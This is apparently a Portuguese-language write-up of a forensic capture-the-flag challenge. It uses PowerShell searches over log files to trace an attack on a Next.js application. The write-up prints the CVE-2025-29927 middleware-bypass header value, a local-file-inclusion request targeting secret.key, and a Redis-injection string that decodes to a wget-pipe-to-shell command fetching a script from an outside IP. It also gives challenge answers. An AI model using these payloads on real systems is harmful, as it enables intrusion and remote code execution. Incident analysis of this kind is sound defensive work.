#Difficult : Easy
***
#### Info
Recebemos 5 arquivos de log para fazermos nossas investigações.
![[Pasted image 20250411081020.png]]
***
#### 1 - What version of Next.js is the application using?
Podemos apenas fazer uma pesquisa com `next.js`, assim mostrara também a versão.
```powershell
Select-String -Path *.log -Pattern next.js
```
![[Pasted image 20250411081539.png]]

**Answer: `15.1.0`**
***
#### 2 - What local port is the Next.js-based application running on?
Essas aplicações costumam ser mapeadas em `localhost` para teste ou acesso interno, então podemos filtra por `localhost` para ver o mapeamento.
```powershell
Select-String -Path *.log -Context 5,5 -Pattern localhost
```
![[Pasted image 20250411082147.png]]

**Answer: `3000`**
***
#### 3 - A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?
Podemos apenas pesquisa pelo `next.js` neste período.
![[Pasted image 20250411082552.png]]

**Answer: `CVE-2025-29927`**
***
#### 4 - The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?
Podemos pesquisar no arquivo que contém as requisições para a aplicação.
```powershell
Select-String -Path access.log -Pattern "GET.*200"
```
![[Pasted image 20250411084315.png]]

**Answer: `main-app.js`**
***
#### 5 - Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?
Primeiro pesquisamos e entendemos como essa vulnerabilidade acontece.
![[Pasted image 20250411085629.png]]

Podemos então pesquisar pela `payload`.
```powershell
Select-String -Path *.log -Context 0,0 -Pattern "GET.*middleware:middleware:middleware"
```
![[Pasted image 20250411085847.png]]

**Answer: `/api/bci/analytics`**
***
#### 6 - How many requests to this endpoint have resulted in an "Unauthorized" response?
Como o código `HTTP` de `Unauthorized` é `401` podemos fazer uma pesquisa incluindo esse código.
```powershell
Select-String -Path *.log -Context 0,0 -Pattern "/api/bci/analytics.*401"
```
![[Pasted image 20250411090332.png]]

Poderíamos usar o `Measure-Object` para contar as linhas, mas como são poucas não faz diferença.
```powershell
Select-String -Path *.log -Context 0,0 -Pattern "/api/bci/analytics.*401" | Measure-Object -Line
```

**Answer: `5`**
***
#### 7 - When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?
Podemos filtrar a primeira requisição com a `payload` que foi feita com secesso.
```powershell
Select-String -Path *.log -Context 0,0 -Pattern "/api/bci/analytics.*200" | Select-Object -First 1
```
![[Pasted image 20250411091511.png]]

**Answer: `2025-04-01 11:38:05`**
***
#### 8 - Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?
Analisando essa vulnerabilidade em https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/, vejo que a payload usada contém 5 vezes `middleware` como valor.
![[Pasted image 20250411092435.png]]

Entretanto, o atacante tentou com apenas 4 vezes em sua última tentativa.
```powershell
Select-String -Path *.log -Context 0,0 -Pattern "x-middleware-subrequest"
```
![[Pasted image 20250411092515.png]]

**Answer: `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`**
***
#### 9 - The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?
Podemos filtrar por `port` e excluir as portas que já conhecemos como `3000`.
```powershell
 Select-String -Path *.log -Context 5,5 -Pattern 'port' | Where-Object { $_ -notmatch "3000" }
```
![[Pasted image 20250411093935.png]]

**Answer: `4000`**
***
#### 10 - After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?
Podemos ver as requisições feitas pela porta `4000`. Identifiquei que o atacante conseguiu uma `LFI` no endpoint `logs`.
```powershell
Select-String -Path *.log -Context 1,1 -Pattern '4000'
```
![[Pasted image 20250411094617.png]]

**Answer: `/logs`**
***
#### 11 - When the vulnerable endpoint found was used maliciously for the first time?
```powershell
Select-String -Path *.log -Context 1 -Pattern '/logs\?logFile='
```
![[Pasted image 20250411095159.png]]

**Answer: `2025-04-01 11:39:01`**
***
#### 12 - What is the attack name the endpoint is vulnerable to?
A vulnerabilidade que presente é a `LFI(Local File Inclusion)`

**Answer: `Local File Inclusion`**
***
#### 13 - What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
Podemos ver qual foi a última requisição com ``LFI`` para acharmos o arquivo.
```powershell
Select-String -Path *.log -Context 1 -Pattern '/logs\?logFile='
```
![[Pasted image 20250411095718.png]]

**Answer: `secret.key`**
***
#### 14 - Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
Pesquisei por `exec` para ver se achava algum comando que executa comandos no sistema.
```powershell
Select-String -Path *.log -Context 1 -Pattern 'exec'
```
![[Pasted image 20250411100827.png]]

**Answer: `OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb`**
***
#### 15 - Once decoded, what is the command?
Aqui usei um decode de `base64` direto do terminal.
![[Pasted image 20250411101341.png]]

**Answer: `wget http://185.202.2.147/h4Pln4/run.sh -O- | sh`**
***

![[Pasted image 20250411101620.png]]